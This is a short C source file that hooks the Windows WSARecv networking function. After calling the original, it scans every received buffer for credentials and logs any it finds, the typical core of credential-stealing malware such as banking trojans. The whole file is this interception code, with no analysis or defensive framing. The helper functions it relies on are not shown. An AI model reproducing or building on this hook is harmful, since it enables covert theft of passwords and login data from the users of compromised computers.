#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <stdio.h>
#include "ntdll.h"

#include "recv.h"
#include "wsarecv.h"

// ws2_32.WSARecv
int WINAPI NewWSARecv(
	SOCKET s,
	LPWSABUF lpBuffers,
	DWORD dwBufferCount,
	LPDWORD lpNumberOfBytesRecvd,
	LPDWORD lpFlags,
	LPWSAOVERLAPPED lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
)
{
	int r;
	DWORD dwCount;

	// call original functions
	r=OldWSARecv(s,lpBuffers,dwBufferCount,lpNumberOfBytesRecvd,lpFlags,lpOverlapped,lpCompletionRoutine);
	if (r!=SOCKET_ERROR)
	{
		for (dwCount=0;dwCount<dwBufferCount;dwCount++)
		{
			if (GetCredentials(lpBuffers[dwCount].buf,lpBuffers[dwCount].len)) 
				LogCapturedCredentials(lpBuffers[dwCount].buf,lpBuffers[dwCount].len,"<<",s);
		}
	}

	return r;
}